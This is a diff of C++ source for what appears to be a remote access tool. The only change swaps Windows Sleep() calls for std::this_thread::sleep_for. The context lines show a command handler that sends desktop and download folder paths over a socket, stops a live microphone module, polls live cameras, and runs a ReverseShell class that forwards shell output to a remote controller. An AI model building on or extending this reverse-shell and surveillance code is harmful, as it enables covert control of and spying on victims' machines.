@@ -243,7 +243,7 @@ void Cliente::Procesar_Comando(std::vector<char>& cBuffer) {
                 strPathBCDown.append(1, CMD_DEL);
                 strPathBCDown += strPath;
                 this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true, nullptr);
-                Sleep(10);
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
             }
             else if (strIn[1] == "ESCRI-DESK") {
                 strPath = this->ObtenerDesk();
@@ -251,7 +251,7 @@ void Cliente::Procesar_Comando(std::vector<char>& cBuffer) {
                 strPathBCDesk.append(1, CMD_DEL);
                 strPathBCDesk += strPath;
                 this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true, nullptr);
-                Sleep(10);
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
             }
             else {
                 strPath = strIn[1];
@@ -558,7 +558,7 @@ void Cliente::Procesar_Comando(std::vector<char>& cBuffer) {
         if (this->mod_Mic != nullptr) {
             this->mod_Mic->sckSocket = this->sckSocket;
             this->mod_Mic->m_DetenerLive();
-            Sleep(100);
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
             delete this->mod_Mic;
             this->mod_Mic = nullptr;
         }
@@ -726,7 +726,7 @@ void Cliente::MainLoop() {
                 for(auto cCam : this->mod_Cam->vcCamObjs) {
                     //Si alguna camara esta live esperar un poco y tratar de volver a leer
                     if (cCam.isLive) {
-                        Sleep(100);
+                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                         continue;
                     }
                 }
@@ -1097,7 +1097,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             if (dBytesReaded > 0) {
                 ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
             }else {
-                Sleep(100);
+                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                 continue;
             }
             for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
@@ -1113,7 +1113,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             strOut += cBuffer2;
         
             int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false, nullptr);
-            Sleep(10);
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
             if (iEnviado <= 0) {
                 //Desconectado o se perdio la conexion
                 std::unique_lock<std::mutex> lock(this->mutex_shell);
